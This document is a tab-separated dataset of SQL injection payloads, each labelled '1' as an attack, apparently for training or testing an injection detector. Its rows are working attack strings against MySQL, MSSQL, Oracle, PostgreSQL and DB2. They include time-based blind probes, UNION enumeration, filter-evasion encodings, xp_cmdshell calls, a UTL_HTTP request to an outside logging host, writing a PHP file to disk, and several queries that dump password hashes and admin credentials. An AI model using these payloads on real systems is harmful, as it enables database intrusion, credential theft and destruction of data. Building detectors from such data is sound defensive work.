Payload	Attacker
+and(select 1 FROM(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT N,1)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)	1
+and+(select 1 FROM(select+count(*),concat((select+concat(0x3a,username,0x3a,password,0x3a,email,0x3a) FROM <TABLE_NAME>+LIMIT+0,1),floor(rand(0)*2))x FROM information_schema.tables+GROUP BY x)b)	1
'+and(select 1 FROM(select count(*),concat((select (select concat(@@hostname)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+	1
'+and(select 1 FROM(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(table_name),0x27,0x7e) FROM `information_schema`.tables WHERE table_schema=<HEX_VLAUE_OF_DB_NAME>)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+	1
sleep(__TIME__)#	1
""" or sleep(__TIME__)="""	1
') or sleep(__TIME__)='	1
;waitfor delay '0:0:__TIME__'--	1
');waitfor delay '0:0:__TIME__'--	1
"""));waitfor delay '0:0:__TIME__'--"	1
' or benchmark(10000000,MD5(1))#	1
1)) or benchmark(10000000,MD5(1))#	1
1 or pg_sleep(__TIME__)--	1
""") or pg_sleep(__TIME__)--"	1
')) or pg_sleep(__TIME__)--	1
or a=a	1
""" or 0=0 #"	1
"""%20or%20""x""=""x"	1
"""a"""" or 3=3--"""	1
"""or 1=1--"	1
%20'sleep%2050'	1
%26%261=0	1
%29	1
%2b'--+' union all select 1,'haha',3,4,5 from mysql.user%23	1
&lt;&gt;&quot;'%;)(&amp;+	1
' AnD '' like '	1
' and '' like '	1
' and 2>3--	1
' and substr(data,1,1) = 0x61# 0x6162	1
' and substr(data,1,1) = lower(conv(36,10,36))# 'z'	1
' or ''='	1
' or 'a' = x'61 # hexadecimal	1
' or 0=0 --	1
' or 1=1 or ''='	1
' or uid like '%	1
' or username like '%	1
'%20or%20''='	1
') or ('a'='a	1
'; exec master..xp_cmdshell	1
'and(true)like(false)union(select(pass)from(users))#	1
'or%20select *	1
'sqlattempt1	1
(	1
)	1
*(|(objectclass=*))	1
-	1
.and '0'=(select top 1 '--+' from admin) union all select 1,2,3 from admin	1
".and 1=(select ""/*"") union all select 1,@@version,3,4,5 from mysql.user-- */"	1
/*--+/*x/*/union all select 1,@@version,@@datadir,4,5 from mysql.user%23	1
0 or 1=1	1
1 or 1=1	1
1' and if(ascii(substr((select{1d user()}),1,1))>11,sleep(1),1)	1
1' union all select 1	1
1' union distinctrow select/*!USER*/(),/*!DATABASE*/()/*f*//*r*//*o*//*m*/users#	1
1' union/**/select/**/1	1
1'or'1'='1	1
9999.and '1'=(select '-- ') union all select 1,2,3	1
99999=(select 1 as '/*') union all select 1 as '*//*',2,3,4,5 from mysql.user as `x*/`%23	1
=%20--	1
?did=-2%0Aunion–%0Aselect%0Auser()	1
?id=123/*/#\*/union/*/#\*/select/*/#\*/1,2,3/*/#\*/from/*/#\*/admin	1
?query=1' || if(ascii(substr((/*!select*/ */*a!*/from test.flag),1,1))=97,1,0)%23	1
AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'	1
Q=1' UNION ALL SELECT NULL,NULL,NULL,NULL,CHR(113)||CHR(107)||CHR(112)||CHR(106)||CHR(113)||NVL(CAST(OWNER AS VARCHAR(4000)),CHR(32))||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113) FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)--	1
UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)	1
\x27\x4F\x52 SELECT *	1
a'	1
a' waitfor delay '0:0:10'--	1
and'a'=(select '--+' from dual) union all select 1,2,3,4,5 from dual--	1
as	1
ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 ceil(pi())*ceil(version()) 24	1
ceil(version()) 6 floor(pi()*version()) 16 floor(version()*version()) 26	1
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)	1
desc	1
extractvalue(floor(0),concat(0x0a,unhex(hex(user()))))	1
extractvalue(rand(0),convert(user() using latin1))	1
floor(pi()) 3 floor(pi()*pi()+pi()) 13 ceil((pi()+ceil(pi()))*pi()) 23	1
floor(version()) 5 ceil(pi()*pi()+version()) 15 floor(pi()*(version()+pi())) 25	1
handler	1
"hi"" or ""a""=""a"	1
hi' or 1=1 --	1
id='select xx /*from*/``%23	1
id=/**//**/union/**//**/%0A/*!SeLEct*/%0A/**/*/**//*!From*/%0A/**/user	1
id=08Eunion select user fr1om/*./*/admin%23	1
id=4+and%23fuck%0a1=2+union+%23qa%0Aselect+1,(load_file(0x433a5c57494e444f57535c73797374656d33325c647269766572735c6574635c686f737473)),3,4,5,6,7,8,9,10	1
id=49 %u0061nd 1=2 un%u0069on se%u006c%u0065ct 1,2,3,4,5 from admin	1
insert	1
length(replace(data, 'a', '')) # length will be shorter	1
lpad(data,1,space(1)) // lpad('hi',4,'?') = '??hi'	1
or 1=1--	1
procedure	1
select	1
select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0	1
select * from`user`;	1
sql=select%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2a%20from%20manager	1
true !!pi() 1 ceil(pi()*pi())+true 11 ceil(ceil(pi())*version()) 21	1
tz_offset	1
update	1
updatexml(1,repeat(user(),2),1)	1
validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1544','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select password from%a0admin limit 1)))%23	1
where id=.1union/*.1*/select'1'	1
where id=.1union/*.1*/select`host`from mysql.user	1
x' AND members.email IS NULL; --	1
xx select xxx, 1e1from xxx //select user,password from mysql.user where user = 'root' and 1=1e1union select user,1e1from mysql.user;	1
xxx'and'1'=(select '-- ') union all select 1,2,3	1
ý or 1=1 --	1
'; exec master..xp_cmdshell 'ping 10.10.1.2'--	1
'exec sp_addlogin 'name' , 'password' --	1
' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)	1
' union (select NULL, NULL, (select @@version)) --	1
convert(int,@@version COLLATE SQL_Latin1_General_Cp1254_CS_AS) and 1=1	1
convert(int,@@SERVERNAME COLLATE SQL_Latin1_General_Cp1254_CS_AS) and 1=1	1
convert(int,(char(72)%2bchar(82)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.tables )%2bchar(82)%2bchar(72))) and 1=1	1
convert(int,(char(72)%2bchar(82)%2b(select top 1 isnull([PASSWD],char(126))%2bchar(94)%2bisnull([USERNAME],char(126)) from (select top 1 [PASSWD],[USERNAME] from [Admin] order by [PASSWD] asc) sq order by [PASSWD] desc)%2bchar(82)%2bchar(72))) and 1=1	1
convert(int,(char(72)%2bchar(82)%2b(select top 1 cast(count(*) as nvarchar(4000)) from [DatabaseName]..[TableName] )%2bchar(82)%2bchar(72))) and 1=1	1
'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --	1
'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --	1
and extractvalue(rand(),concat(database()))—	1
' or '1'='1	1
*/*	1
' and count(/*)=1 and '1'='1	1
"or 1=1 or """"="	1
""""	1
""" or 0=0 --"	1
""") or (""a""=""a"	1
#	1
%21	1
%29	1
%7C	1
'	1
' AnD '' like '	1
' and '' like '	1
' and 2>3--	1
' or 'x'='x	1
' or 1 --'	1
' or 3=3	1
' or user like '%	1
'%20or%20'x'='x	1
') or ('x'='x	1
'; exec xp_regread	1
'or''='	1
(	1
) or (a=a	1
*|	1
--';	1
//*	1
1 or 1=1	1
1'1	1
23 OR 1=1	1
= ;	1
PRINT @@variable	1
\x27\x4F\x52 SELECT *	1
a'	1
a' waitfor delay '0:0:10'--	1
asc	1
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)	1
desc	1
fake@ema'or'il.nl'='il.nl	1
hi or a=a	1
hi' or 'a'='a	1
like	1
or 0=0 --	1
order by	1
t'exec master..xp_cmdshell 'nslookup www.google.com'--	1
update	1
x' AND userid IS NULL; --	1
‘ or 1=1 --	1
1\'1	1
1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --	1
SELECT user; 	1
SELECT getpgusername();	1
SELECT usename FROM pg_user WHERE usesuper IS TRUE	1
SELECT current_setting('hba_file');	1
SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) 	1
CREATE TABLE mydata(t text);	1
DROP TABLE mytest mytest;	1
CREATE USER HR PASSWORD 'Zer0Lulz';	1
SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP';	1
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;	1
SELECT UTL_INADDR.get_host_name('<insert-INternal-IP-Address-2-get-hostname>') FROM dual;	1
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah'; 	1
SELECT instance_name FROM v$instance;	1
SELECT name, password, astatus FROM sys.user$;	1
SELECT table_name FROM all_tables;	1
SELECT value FROM v$parameter2 WHERE name = 'utl_file_dir'; SELECT version FROM v$instance;	1
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i	1
' || myappadmin.adduser('admin', 'newpass') || '	1
'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 	1
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)	1
declare @s varchar(22) select @s =	1
distinct	1
exec(@s)	1
exec xp	1
having	1
"""hi"""") or (""""a""""=""""a"""	1
'hi' or 'x'='x';	1
*(|(mail=*))	1
"or 0=0 #"""	1
or 0=0 --	1
; or '1'='1'	1
' or 1=1 /*	1
‘ or 1=1 --	1
"or 1=1 or """"="	1
or%201=1 --	1
‘ or 3=3 --	1
' or 'a'='a	1
) or (a=a	1
""" or isNULL(1/0) /*"	1
' or 'text' > 't'	1
' or userid like '%	1
' or 'whatever' in ('whatever')	1
PRINT @@variable	1
' select * from information_schema.tables--	1
'sqlattempt1	1
(sqlvuln)	1
truncate	1
' union select 	1
) union select * from information_schema.tables;	1
,@variable	1
x' AND 1=(SELECT COUNT(*) FROM tabname); --	1
x' or 1=1 or 'x'='y	1
select user from sysibm.sysdummy1;	1
select name from sysibm.systables;	1
select * from syscat.tabauth where grantee = current user;	1
and 0=(select count(*) from N:\.a)%00	1
and Len((select Count(*) from [TableName]))=<insert-numerical-value>	1
convert(int,user COLLATE SQL_Latin1_General_Cp1254_CS_AS) and 1=1	1
convert(int,db_name() COLLATE SQL_Latin1_General_Cp1254_CS_AS) and 1=1	1
convert(int,(char(126)%2b(select distinct top 1 table_name from (select distinct top N table_name from information_schema.tables order BY table_name ASC) sq order BY table_name DESC)%2bchar(126))) and 1=1	1
convert(int,(char(126)%2b(select distinct top 1 table_name from (select distinct top N table_name from DatabaseName.OwnerName.ObjectORtableName order BY table_name ASC) sq order BY table_name DESC)%2bchar(126))) and 1=1	1
convert(int,(char(82)%2bchar(33)%2b(select top 1 isnull([ColumnName],char(32)) from (select top 1 [ColumnName] from [DatabaseName]..[TableName] order by [ColumnName] asc) sq order by [ColumnName] desc)%2bchar(33)%2bchar(82))) and 1=1	1
and ord(mid(user(),1,1))=114	1
and 1=2 union select 1,SCHEMA_NAME from  information_schema.SCHEMATA limit 2,2	1
and 1=2 union select 1,TABLE_NAME from  information_schema.TABLES where TABLE_SCHEMA=0x6d79746573746462 limit 0,1	1
and 1=2 union select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x6d7973716c	1
and 1=2 union select 1,COLUMN_NAME from information_schema.COLUMNS where  TABLE_NAME=0x74657374746162 limit 3,3	1
SELECT version FROM v$instance;	1
SELECT name, password, astatus FROM sys.user$;	1
SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';	1
SELECT host_name FROM v$instance;	1
SELECT global_name FROM global_name; 	1
SELECT DISTINCT owner FROM all_tables;	1
SELECT owner, table_name FROM all_tables;	1
SELECT banner FROM v$version WHERE banner LIKE '%Oracle%';	1
SELECT 1/*1*/FROM dual; --comment	1
SELECT name,password,astatus FROM sys.user$ --priv,<10g astatus tells you if acct is locked.	1
SELECT grantee FROM dba_sys_privs WHERE privilege='SELECT ANY DICTIONARY';	1
SELECT name FROM v$database;	1
SELECT owner,table_name FROM all_tables;	1
SELECT username FROM (SELECT ROWNUM r,username FROM all_users ORDER BY username) WHERE r=9;	1
SELECT chr(65) from dual;	1
SELECT chr(65)||chr(66) FROM dual; -- returns AB	1
SELECT UTL_HTTP.REQUEST('http://iplogger.org/1iP73') FROM dual;	1
if it's installed 'ExtProc' can sometimes be used too,though it normally failed for me.	1
SELECT UTL_INADDR.get_host_name FROM dual;	1
SELECT name FROM V$DATAFILE;	1
select session_user;	1
select current_setting('password_encryption');	1
select current_setting('config_file');	1
select * from pg_group;	1
SELECT pg_sleep(10);	1
SELECT session_user; 	1
SELECT usename, passwd FROM pg_shadow;	1
SELECT inet_server_port();	1
SELECT datname FROM pg_databaseSELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') 	1
SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;	1
...' UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2;	1
COPY mytable (mycol) TO '/tmp/test.php';	1
DROP USER HR;	1
')%20waitfor%20delay%20'0:0:20'%20--	1
))%20waitfor%20delay%20'0:0:20'%20--	1
"""))%20waitfor%20delay%20'0:0:20'%20--"	1
',NULL)%20waitfor%20delay%20'0:0:20'%20--	1
),NULL)%20waitfor%20delay%20'0:0:20'%20--	1
"""),NULL)%20waitfor%20delay%20'0:0:20'%20--"	1
',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--	1
),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--	1
"""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"	1
',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--	1
),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--	1
"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"	1
',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--	1
),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--	1
"""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"	1
',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--	1
),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--	1
"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"	1
""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"	1
'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*	1
,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*	1
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"	1
'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*	1
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*	1
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"	1
'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*	1
waitfor delay '0:0:20' /* 	1
""" waitfor delay '0:0:20' /* "	1
)) waitfor delay '0:0:20' /* 	1
)))) waitfor delay '0:0:20' /* 	1
') waitfor delay '0:0:20' /* 	1
')) waitfor delay '0:0:20' /* 	1
'))) waitfor delay '0:0:20' /* 	1
')))) waitfor delay '0:0:20' /* 	1
'))))) waitfor delay '0:0:20' /* 	1
')))))) waitfor delay '0:0:20' /* 	1
+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23"	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23"	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*"	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23	1
+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23"	1
'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*	1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"	1
,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23	1
""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*"	1
),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--	1
'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23	1
and 0=benchmark(3000000,MD5(1))%20/*	1
' and 0=benchmark(3000000,MD5(1))%20--	1
""" and 0=benchmark(3000000,MD5(1))%20%23"	1
)) and 0=benchmark(3000000,MD5(1))%20/*	1
))) and 0=benchmark(3000000,MD5(1))%20--	1
)))) and 0=benchmark(3000000,MD5(1))%20%23	1
""") and 0=benchmark(3000000,MD5(1))%20/*"	1
')) and 0=benchmark(3000000,MD5(1))%20--	1
""")) and 0=benchmark(3000000,MD5(1))%20%23"	1
"""))) and 0=benchmark(3000000,MD5(1))%20/*"	1
')))) and 0=benchmark(3000000,MD5(1))%20--	1
""")))) and 0=benchmark(3000000,MD5(1))%20%23"	1
; IF (ASCII(lower(substring((USER),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+	1
; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),N,1)))InsertComparer<>=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+	1
; IF (LEN(SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound')=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+	1
; IF (LEN(SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound' and column_name>,'PreviousColumnFound')=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+	1
; IF (LEN(SELECT TOP 1 ColumnName from TableName where ColumnName NOT in ('FoundTableName') order by TableName desc)=<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--+	1
; IF (LEN(USER)=N) WAITFOR DELAY '00:00:10'--	1
; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype='U')=N) WAITFOR DELAY '00:00:10'--	1
; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name>’PreviouslyFoundTable’),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--	1
; IF (ASCII(lower(substring((SELECT TOP 1 column_name from testDB.information_schema.columns where table_name='FirstTableFound' and column_name>'PreviousColumnFound'),N,1)))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--	1
; IF (ASCII(substring((SELECT TOP 1 ColumnName from TableName),N,1))Insert<>=Comparer<InsertCharValueHere>) WAITFOR DELAY '00:00:10'--	1
+waitfor+delay+'0:0:10'--	1
+waitfor+delay+'0:0:10'/*	1
'+waitfor+delay+'0:0:10'--+	1
+and+0=benchmark(3000000,MD5(1))+--	1
+and+0=benchmark(3000000,MD5(1))+/*	1
'+and+0=benchmark(3000000,MD5(1))+--+	1
1 or sleep(__TIME__)#	1
' or sleep(__TIME__)='	1
1)) or sleep(__TIME__)#	1
1 or pg_sleep(__TIME__)--	1
""") or pg_sleep(__TIME__)--"	1
')) or pg_sleep(__TIME__)--	1
/**/UNunionION/**/SELselectECT/**/	1
+union+all+select+	1
/**//*U*//*n*//*I*//*O*//*n*//**//*all*//**//*S*//*E*//*l*//*e*//*C*//*t*//**/	1
/**/union/**/select/**/1,2,3,4--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48--	1
/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.28.29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52--	1
+union+select+1--	1
+union+select+1,2,3,4,5--	1
+union+select+1,2,3,4,5,6,7,8,9--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13--	1
+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--	1
